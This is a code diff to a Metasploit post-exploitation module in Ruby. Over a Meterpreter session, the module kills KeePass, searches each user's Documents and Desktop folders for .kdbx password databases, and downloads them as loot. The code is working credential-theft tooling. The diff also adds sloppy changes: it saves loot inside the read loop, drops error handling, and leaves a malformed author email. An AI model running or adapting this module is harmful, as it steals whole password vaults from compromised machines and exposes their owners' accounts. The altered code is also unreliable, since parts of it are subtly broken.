@@ -11,22 +11,23 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/user_profiles'
 
+
+
 class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::UserProfiles
-
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Keepass Database Finder',
-				'Description'   => %q{
-					This module downloads any keepass kdbx files that it finds
+			'Name'          => 'Windows Keepass Database Finder',
+			'Description'   => %q{
+				This module downloads any keepass kdbx files that it finds
 				},
 				'License'       => MSF_LICENSE,
-				'Author'        => [ 'balgan <balgan[at]balgan.eu>'],
+				'Author'        => [ 'balgan <balgan[at]ptcoresec.eu>', 'klinzter <klinzter[at]ptcoresec.eu'],
 				'Version'       => '$Revision: 3195e713 $',
 				'Platform'      => [ 'windows' ],
 				'SessionTypes'  => [ 'meterpreter' ]
-			))
+				))
 	end
 
 	def run
@@ -34,35 +35,47 @@ class Metasploit3 < Msf::Post
 		print_status("Attempting to kill keepass")
 		kill_keepass()
 		grab_user_profiles().each do |user|
+		print_status("Searching #{user['MyDocs']}")
 			next if user['MyDocs'] == nil
-			tmpath= user['MyDocs'] + "\\empty.kdbx"
-			print_status("Retrieving:" + tmpath)
-			jack_keepass(tmpath)
+			dir = user['MyDocs']
+			files = client.fs.dir.entries(dir)
+			files.each do |f|
+				if f.to_s.include?(".kdbx")
+					begin
+						filelocation = dir + "\\" + f
+						jack_keepass(filelocation)
+					end
+				end
+			end
+		end
+
+		grab_user_profiles().each do |user|
+			print_status("Searching #{user['Desktop']}")
 			next if user['Desktop'] == nil
-			tmpath= user['Desktop'] + "\\empty.kdbx"
-			print_status("Retrieving:" + tmpath)
-			jack_keepass(tmpath)
-			
+			dir = user['Desktop']
+			files = client.fs.dir.entries(dir)
+			files.each do |f|
+				if f.to_s.include?(".kdbx")
+					begin
+						filelocation = dir + "\\" + f
+						jack_keepass(filelocation)
+					end
+				end
+			end
 		end
 	end
 
-	def jack_keepass(filename)
-		data     = ""
-		found    = session.fs.file.stat(filename) rescue nil
-		return if not found
-		print_status("Keepass Database Found At #{filename}")
-		print_status("     Retrieving keepass file...")
 
+	def jack_keepass(filename)
+		print_status("Downloading:  #{filename}")
 		begin
-			wallet = session.fs.file.new(filename, "rb")
-			until wallet.eof?
-				data << wallet.read
+			path = filename
+				data = ""
+			filesaving = session.fs.file.new(path, "rb")
+			until filesaving.eof?
+				data << filesaving.read
+			store_loot("KEEPASS.kdbx", "text/plain", session, data, filename, "loot #{path}")
 			end
-			store_loot("keepass.kdbx", "application/octet-stream", session, data, filename, "Keepass database")
-		rescue ::Interrupt
-			raise $!
-		rescue ::Exception => e
-			print_error("Failed to download #{filename}: #{e.class} #{e}")
 		end
 	end
 
@@ -75,5 +88,4 @@ class Metasploit3 < Msf::Post
 			end
 		end
 	end
-
 end
